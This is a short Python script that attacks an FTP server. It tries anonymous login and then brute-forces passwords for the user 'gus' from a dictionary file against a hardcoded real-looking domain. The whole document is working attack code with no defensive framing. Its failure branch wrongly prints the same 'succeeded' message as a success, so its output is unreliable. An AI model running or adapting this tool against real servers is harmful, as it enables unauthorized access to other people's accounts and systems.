import ftplib

def connect(host, user,password):
	try:
		ftp = ftplib.FTP(host)
		ftp.login(user,password)
		ftp.quit()
		return True
	except:
		return False

def main():
	#Variables
	targetHostAddress = 'immersivemedia.ph'
	userName = 'gus'
	passwordFilePath = 'password.txt'

	#Try to connect using anonumous credentials
	print '[+] Using anonymous credentials for' + targetHostAddress
	if connect(targetHostAddress, 'anonymous', 'test@test.com'):
		print '[*] FTP Anonymous log on succeeded on host' + targetHostAddress
	else:
		print '[*] FTP Anonymous log on failed on host' + targetHostAddress

		#Try brute force using dictionary file
		#Open password dictionary file

		passwordsFile = open(passwordFilePath, 'r')

		for line in passwordsFile.readlines():
			#clean the line in the dictionary file
			password = line.strip('\r').strip('\n')
			print "Testing: " + str(password)

			if connect(targetHostAddress, userName, password):
				#Password Found
				print "[*] FTP Logon succeeeded on host " + targetHostAddress + " Username " + userName  + " Password " + password
				exit(0)
			else:
				#Password Not Found
				print "[*] FTP Logon succeeeded on host " + targetHostAddress + " Username " + userName  + " Password " + password


if __name__ == "__main__":
	main()
